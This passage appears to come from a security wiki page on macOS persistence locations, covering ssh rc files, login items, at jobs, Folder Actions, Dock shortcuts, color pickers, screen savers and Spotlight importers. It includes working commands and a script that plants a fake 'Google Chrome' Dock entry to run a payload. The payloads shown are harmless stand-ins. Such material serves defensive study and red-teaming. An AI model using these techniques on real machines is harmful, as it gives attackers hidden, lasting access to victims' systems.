<ul>
<li>But BetterTouchTool must be installed</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>It requests Automation-Shortcuts and Accessibility permissions</li>
</ul>
</li>
</ul>
<h4 id="location-9"><a class="header" href="#location-9">Location</a></h4>
<ul>
<li><code>~/Library/Application Support/BetterTouchTool/*</code></li>
</ul>
<p>This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own <strong>shortcut and action to execute in the database</strong> to make it execute arbitrary code (a shortcut could be to just to press a key).</p>
<h3 id="alfred"><a class="header" href="#alfred">Alfred</a></h3>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But Alfred must be installed</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>It requests Automation, Accessibility and even Full-Disk access permissions</li>
</ul>
</li>
</ul>
<h4 id="location-10"><a class="header" href="#location-10">Location</a></h4>
<ul>
<li><code>???</code></li>
</ul>
<p>It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).</p>
<h3 id="sshrc"><a class="header" href="#sshrc">SSHRC</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0006/">https://theevilbit.github.io/beyond/beyond_0006/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But ssh needs to be enabled and used</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>SSH use to have FDA access</li>
</ul>
</li>
</ul>
<h4 id="location-11"><a class="header" href="#location-11">Location</a></h4>
<ul>
<li><strong><code>~/.ssh/rc</code></strong>
<ul>
<li><strong>Trigger</strong>: Login via ssh</li>
</ul>
</li>
<li><strong><code>/etc/ssh/sshrc</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Login via ssh</li>
</ul>
</li>
</ul>
<div class='notice notice-danger'><b>DANGER</b><br/>
To turn ssh on requres Full Disk Access:
<pre><code class="language-bash">sudo systemsetup -setremotelogin on
</code></pre>
</div>
<h4 id="description--exploitation-8"><a class="header" href="#description--exploitation-8">Description &amp; Exploitation</a></h4>
<p>By default, unless <code>PermitUserRC no</code> in <code>/etc/ssh/sshd_config</code>, when a user <strong>logins via SSH</strong> the scripts <strong><code>/etc/ssh/sshrc</code></strong> and <strong><code>~/.ssh/rc</code></strong> will be executed.</p>
<h3 id="login-items"><a class="header" href="#login-items"><strong>Login Items</strong></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0003/">https://theevilbit.github.io/beyond/beyond_0003/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But you need to execute <code>osascript</code> with args</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="locations-3"><a class="header" href="#locations-3">Locations</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong>
<ul>
<li><strong>Trigger:</strong> Login</li>
<li>Exploit payload stored calling <strong><code>osascript</code></strong></li>
</ul>
</li>
<li><strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong>
<ul>
<li><strong>Trigger:</strong> Login</li>
<li>Root required</li>
</ul>
</li>
</ul>
<h4 id="description-3"><a class="header" href="#description-3">Description</a></h4>
<p>In System Preferences -&gt; Users &amp; Groups -&gt; <strong>Login Items</strong> you can find <strong>items to be executed when the user logs in</strong>.<br />
It it's possible to list them, add and remove from the command line:</p>
<pre><code class="language-bash">#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}' 

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"' 
</code></pre>
<p>These items are stored in the file <strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong></p>
<p><strong>Login items</strong> can <strong>also</strong> be indicated in using the API <a href="https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc">SMLoginItemSetEnabled</a> which will store the configuration in <strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong></p>
<h3 id="zip-as-login-item"><a class="header" href="#zip-as-login-item">ZIP as Login Item</a></h3>
<p>(Check previous section about Login Items, this is an extension)</p>
<p>If you store a <strong>ZIP</strong> file as a <strong>Login Item</strong> the <strong><code>Archive Utility</code></strong> will open it and if the zip was for example stored in <strong><code>~/Library</code></strong> and contained the Folder <strong><code>LaunchAgents/file.plist</code></strong> with a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the <strong>backdoor indicated in the plist will be executed</strong>.</p>
<p>Another options would be to create the files <strong><code>.bash_profile</code></strong> and <strong><code>.zshenv</code></strong> inside the user HOME so if the folder LaunchAgents already exist this technique would still work.</p>
<h3 id="at"><a class="header" href="#at">At</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0014/">https://theevilbit.github.io/beyond/beyond_0014/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But you need to <strong>execute</strong> <strong><code>at</code></strong> and it must be <strong>enabled</strong></li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-12"><a class="header" href="#location-12">Location</a></h4>
<ul>
<li>Need to <strong>execute</strong> <strong><code>at</code></strong> and it must be <strong>enabled</strong></li>
</ul>
<h4 id="description-4"><a class="header" href="#description-4"><strong>Description</strong></a></h4>
<p><code>at</code> tasks are designed for <strong>scheduling one-time tasks</strong> to be executed at certain times. Unlike cron jobs, <code>at</code> tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.</p>
<p>By <strong>default</strong> they are <strong>disabled</strong> but the <strong>root</strong> user can <strong>enable</strong> <strong>them</strong> with:</p>
<pre><code class="language-bash">sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
</code></pre>
<p>This will create a file in 1 hour:</p>
<pre><code class="language-bash">echo "echo 11 &gt; /tmp/at.txt" | at now+1
</code></pre>
<p>Check the job queue using <code>atq:</code></p>
<pre><code class="language-shell-session">sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
</code></pre>
<p>Above we can see two jobs scheduled. We can print the details of the job using <code>at -c JOBNUMBER</code></p>
<pre><code class="language-shell-session">sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' &gt;&amp;2
	 exit 1
}
unset OLDPWD
echo 11 &gt; /tmp/at.txt
</code></pre>
<div class='notice notice-warning'><b>WARNING</b><br/>
If AT tasks aren't enabled the created tasks won't be executed.
</div>
<p>The <strong>job files</strong> can be found at <code>/private/var/at/jobs/</code></p>
<pre><code>sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
</code></pre>
<p>The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at <code>a0001a019bdcd2</code>.</p>
<ul>
<li><code>a</code> - this is the queue</li>
<li><code>0001a</code> - job number in hex, <code>0x1a = 26</code></li>
<li><code>019bdcd2</code> - time in hex. It represents the minutes passed since epoch. <code>0x019bdcd2</code> is <code>26991826</code> in decimal. If we multiply it by 60 we get <code>1619509560</code>, which is <code>GMT: 2021. April 27., Tuesday 7:46:00</code>.</li>
</ul>
<p>If we print the job file, we find that it contains the same information we got using <code>at -c</code>.</p>
<h3 id="folder-actions"><a class="header" href="#folder-actions">Folder Actions</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0024/">https://theevilbit.github.io/beyond/beyond_0024/</a><br />
Writeup: <a href="https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d">https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But you need to be able to call <code>osascript</code> with arguments to contact <strong><code>System Events</code></strong> to be able to configure Folder Actions</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>It has some basic TCC permissions like Desktop, Documents and Downloads</li>
</ul>
</li>
</ul>
<h4 id="location-13"><a class="header" href="#location-13">Location</a></h4>
<ul>
<li><strong><code>/Library/Scripts/Folder Action Scripts</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Access to the specified folder</li>
</ul>
</li>
<li><strong><code>~/Library/Scripts/Folder Action Scripts</code></strong>
<ul>
<li><strong>Trigger</strong>: Access to the specified folder</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-9"><a class="header" href="#description--exploitation-9">Description &amp; Exploitation</a></h4>
<p>Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.</p>
<p>To set up Folder Actions, you have options like:</p>
<ol>
<li>Crafting a Folder Action workflow with <a href="https://support.apple.com/guide/automator/welcome/mac">Automator</a> and installing it as a service.</li>
<li>Attaching a script manually via the Folder Actions Setup in the context menu of a folder.</li>
<li>Utilizing OSAScript to send Apple Event messages to the <code>System Events.app</code> for programmatically setting up a Folder Action.
<ul>
<li>This method is particularly useful for embedding the action into the system, offering a level of persistence.</li>
</ul>
</li>
</ol>
<p>The following script is an example of what can be executed by a Folder Action:</p>
<pre><code class="language-applescript">// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>To make the above script usable by Folder Actions, compile it using:</p>
<pre><code class="language-bash">osacompile -l JavaScript -o folder.scpt source.js
</code></pre>
<p>After the script is compiled, set up Folder Actions by executing the script below. This script will enable Folder Actions globally and specifically attach the previously compiled script to the Desktop folder.</p>
<pre><code class="language-javascript">// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
</code></pre>
<p>Run the setup script with:</p>
<pre><code class="language-bash">osascript -l JavaScript /Users/username/attach.scpt
</code></pre>
<ul>
<li>This is the way yo implement this persistence via GUI:</li>
</ul>
<p>This is the script that will be executed:</p>
<p><code>source.js</code></p>
<pre><code class="language-applescript">var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>Compile it with: <code>osacompile -l JavaScript -o folder.scpt source.js</code></p>
<p>Move it to:</p>
<pre><code class="language-bash">mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
</code></pre>
<p>Then, open the <code>Folder Actions Setup</code> app, select the <strong>folder you would like to watch</strong> and select in your case <strong><code>folder.scpt</code></strong> (in my case I called it output2.scp):</p>
<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
<p>Now, if you open that folder with <strong>Finder</strong>, your script will be executed.</p>
<p>This configuration was stored in the <strong>plist</strong> located in <strong><code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> in base64 format.</p>
<p>Now, lets try to prepare this persistence without GUI access:</p>
<ol>
<li><strong>Copy <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> to <code>/tmp</code> to backup it:
<ul>
<li><code>cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp</code></li>
</ul>
</li>
<li><strong>Remove</strong> the Folder Actions you just set:</li>
</ol>
<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
<p>Now that we have an empty environment</p>
<ol start="3">
<li>Copy the backup file: <code>cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/</code></li>
<li>Open the Folder Actions Setup.app to consume this config: <code>open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"</code></li>
</ol>
<div class='notice notice-danger'><b>DANGER</b><br/>
And this didn't work for me, but those are the instructions from the writeup:(
</div>
<h3 id="dock-shortcuts"><a class="header" href="#dock-shortcuts">Dock shortcuts</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0027/">https://theevilbit.github.io/beyond/beyond_0027/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/check-mark-button">✅</a>
<ul>
<li>But you need to have installed a malicious application inside the system</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-14"><a class="header" href="#location-14">Location</a></h4>
<ul>
<li><code>~/Library/Preferences/com.apple.dock.plist</code>
<ul>
<li><strong>Trigger</strong>: When the user clicks on the app inside the dock</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-10"><a class="header" href="#description--exploitation-10">Description &amp; Exploitation</a></h4>
<p>All the applications that appear in the Dock are specified inside the plist: <strong><code>~/Library/Preferences/com.apple.dock.plist</code></strong></p>
<p>It's possible to <strong>add an application</strong> just with:</p>
<pre><code class="language-bash"># Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/System/Applications/Books.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'

# Restart Dock
killall Dock
</code></pre>
<p>Using some <strong>social engineering</strong> you could <strong>impersonate for example Google Chrome</strong> inside the dock and actually execute your own script:</p>
<pre><code class="language-bash">#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2&gt;/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &amp;
touch /tmp/ImGoogleChrome' &gt; /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat &lt;&lt; EOF &gt; /tmp/Google\ Chrome.app/Contents/Info.plist
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;CFBundleExecutable&lt;/key&gt;
    &lt;string&gt;Google Chrome&lt;/string&gt;
    &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
    &lt;string&gt;com.google.Chrome&lt;/string&gt;
    &lt;key&gt;CFBundleName&lt;/key&gt;
    &lt;string&gt;Google Chrome&lt;/string&gt;
    &lt;key&gt;CFBundleVersion&lt;/key&gt;
    &lt;string&gt;1.0&lt;/string&gt;
    &lt;key&gt;CFBundleShortVersionString&lt;/key&gt;
    &lt;string&gt;1.0&lt;/string&gt;
    &lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;
    &lt;string&gt;6.0&lt;/string&gt;
    &lt;key&gt;CFBundlePackageType&lt;/key&gt;
    &lt;string&gt;APPL&lt;/string&gt;
    &lt;key&gt;CFBundleIconFile&lt;/key&gt;
    &lt;string&gt;app&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/tmp/Google Chrome.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'
killall Dock
</code></pre>
<h3 id="color-pickers"><a class="header" href="#color-pickers">Color Pickers</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0017/">https://theevilbit.github.io/beyond/beyond_0017</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>A very specific action needs to happen</li>
<li>You will end in another sandbox</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-15"><a class="header" href="#location-15">Location</a></h4>
<ul>
<li><code>/Library/ColorPickers</code>
<ul>
<li>Root required</li>
<li>Trigger: Use the color picker</li>
</ul>
</li>
<li><code>~/Library/ColorPickers</code>
<ul>
<li>Trigger: Use the color picker</li>
</ul>
</li>
</ul>
<h4 id="description--exploit"><a class="header" href="#description--exploit">Description &amp; Exploit</a></h4>
<p><strong>Compile a color picker</strong> bundle with your code (you could use <a href="https://github.com/viktorstrate/color-picker-plus"><strong>this one for example</strong></a>) and add a constructor (like in the <a href="macos-auto-start-locations.html#screen-saver">Screen Saver section</a>) and copy the bundle to <code>~/Library/ColorPickers</code>.</p>
<p>Then, when the color picker is triggered your should should be aswell.</p>
<p>Note that the binary loading your library has a <strong>very restrictive sandbox</strong>: <code>/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64</code></p>
<pre><code class="language-bash">[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
</code></pre>
<h3 id="finder-sync-plugins"><a class="header" href="#finder-sync-plugins">Finder Sync Plugins</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0026/">https://theevilbit.github.io/beyond/beyond_0026/</a><br />
<strong>Writeup</strong>: <a href="https://objective-see.org/blog/blog_0x11.html">https://objective-see.org/blog/blog_0x11.html</a></p>
<ul>
<li>Useful to bypass sandbox: <strong>No, because you need to execute your own app</strong></li>
<li>TCC bypass: ???</li>
</ul>
<h4 id="location-16"><a class="header" href="#location-16">Location</a></h4>
<ul>
<li>A specific app</li>
</ul>
<h4 id="description--exploit-1"><a class="header" href="#description--exploit-1">Description &amp; Exploit</a></h4>
<p>An application example with a Finder Sync Extension <a href="https://github.com/D00MFist/InSync"><strong>can be found here</strong></a>.</p>
<p>Applications can have <code>Finder Sync Extensions</code>. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it <strong>must be signed</strong> with some valid Apple developer certificate, it must be <strong>sandboxed</strong> (although relaxed exceptions could be added) and it must be registered with something like:</p>
<pre><code class="language-bash">pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
</code></pre>
<h3 id="screen-saver"><a class="header" href="#screen-saver">Screen Saver</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0016/">https://theevilbit.github.io/beyond/beyond_0016/</a><br />
Writeup: <a href="https://posts.specterops.io/saving-your-access-d562bf5bf90b">https://posts.specterops.io/saving-your-access-d562bf5bf90b</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you will end in a common application sandbox</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-17"><a class="header" href="#location-17">Location</a></h4>
<ul>
<li><code>/System/Library/Screen Savers</code>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Select the screen saver</li>
</ul>
</li>
<li><code>/Library/Screen Savers</code>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: Select the screen saver</li>
</ul>
</li>
<li><code>~/Library/Screen Savers</code>
<ul>
<li><strong>Trigger</strong>: Select the screen saver</li>
</ul>
</li>
</ul>
<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
<h4 id="description--exploit-2"><a class="header" href="#description--exploit-2">Description &amp; Exploit</a></h4>
<p>Create a new project in Xcode and select the template to generate a new <strong>Screen Saver</strong>. Then, are your code to it, for example the following code to generate logs.</p>
<p><strong>Build</strong> it, and copy the <code>.saver</code> bundle to <strong><code>~/Library/Screen Savers</code></strong>. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:</p>
<pre><code class="language-bash">sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
</code></pre>
<div class='notice notice-danger'><b>DANGER</b><br/>
Note that because inside the entitlements of the binary that loads this code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) you can find **`com.apple.security.app-sandbox`** you will be **inside the common application sandbox**.
</div>
<p>Saver code:</p>
<pre><code class="language-objectivec">//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
</code></pre>
<h3 id="spotlight-plugins"><a class="header" href="#spotlight-plugins">Spotlight Plugins</a></h3>
<p>writeup: <a href="https://theevilbit.github.io/beyond/beyond_0011/">https://theevilbit.github.io/beyond/beyond_0011/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you will end in an application sandbox</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a>
<ul>
<li>The sandbox looks very limited</li>
</ul>
</li>
</ul>
<h4 id="location-18"><a class="header" href="#location-18">Location</a></h4>
<ul>
<li><code>~/Library/Spotlight/</code>
<ul>
<li><strong>Trigger</strong>: A new file with a extension managed by the spotlight plugin is created.</li>
</ul>
</li>
<li><code>/Library/Spotlight/</code>
<ul>
<li><strong>Trigger</strong>: A new file with a extension managed by the spotlight plugin is created.</li>
<li>Root required</li>
</ul>
</li>
<li><code>/System/Library/Spotlight/</code>
<ul>
<li><strong>Trigger</strong>: A new file with a extension managed by the spotlight plugin is created.</li>
<li>Root required</li>
</ul>
</li>
<li><code>Some.app/Contents/Library/Spotlight/</code>
<ul>
<li><strong>Trigger</strong>: A new file with a extension managed by the spotlight plugin is created.</li>
<li>New app required</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-11"><a class="header" href="#description--exploitation-11">Description &amp; Exploitation</a></h4>
<p>Spotlight is macOS's built-in search feature, designed to provide users with <strong>quick and comprehensive access to data on their computers</strong>.<br />
To facilitate this rapid search capability, Spotlight maintains a <strong>proprietary database</strong> and creates an index by <strong>parsing most files</strong>, enabling swift searches through both file names and their content.</p>
<p>The underlying mechanism of Spotlight involves a central process named 'mds', which stands for <strong>'metadata server'.</strong> This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (<code>ps -ef | grep mdworker</code>). These tasks are made possible through Spotlight importer plugins, or <strong>".mdimporter bundles</strong>", which enable Spotlight to understand and index content across a diverse range of file formats.</p>
<p>The plugins or <strong><code>.mdimporter</code></strong> bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which <strong>file type and extensions they can manage</strong>, this way, Spotlight will use them when a new file with the indicated extension is created.</p>
<p>It's possible to <strong>find all the <code>mdimporters</code></strong> loaded running:</p>
<pre><code class="language-bash">mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
</code></pre>
<p>And for example <strong>/Library/Spotlight/iBooksAuthor.mdimporter</strong> is used to parse these type of files (extensions <code>.iba</code> and <code>.book</code> among others):</p>
<pre><code class="language-json">plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" =&gt; [
    0 =&gt; {
      "CFBundleTypeName" =&gt; "iBooks Author Book"
      "CFBundleTypeRole" =&gt; "MDImporter"
      "LSItemContentTypes" =&gt; [
        0 =&gt; "com.apple.ibooksauthor.book"
        1 =&gt; "com.apple.ibooksauthor.pkgbook"
        2 =&gt; "com.apple.ibooksauthor.template"
        3 =&gt; "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" =&gt; 0
    }
  ]
[...]
 =&gt; {
      "UTTypeConformsTo" =&gt; [
        0 =&gt; "public.data"
        1 =&gt; "public.composite-content"
      ]
      "UTTypeDescription" =&gt; "iBooks Author Book"
      "UTTypeIdentifier" =&gt; "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" =&gt; "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" =&gt; {
        "public.filename-extension" =&gt; [
          0 =&gt; "iba"
          1 =&gt; "book"
        ]
      }
    }
[...]
</code></pre>
<div class='notice notice-danger'><b>DANGER</b><br/>
If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**. Thats because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) and it doesn't need to specify extensions.
<p>Moreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own <code>mdimporters</code>.</p>
</div>
<p>To create your own importer you could start with this project: <a href="https://github.com/megrimm/pd-spotlight-importer">https://github.com/megrimm/pd-spotlight-importer</a> and then change the name, the <strong><code>CFBundleDocumentTypes</code></strong> and add <strong><code>UTImportedTypeDeclarations</code></strong> so it supports the extension you would like to support and refelc them in <strong><code>schema.xml</code></strong>.<br />
Then <strong>change</strong> the code of the function <strong><code>GetMetadataForFile</code></strong> to execute your payload when a file with the processed extension is created.</p>
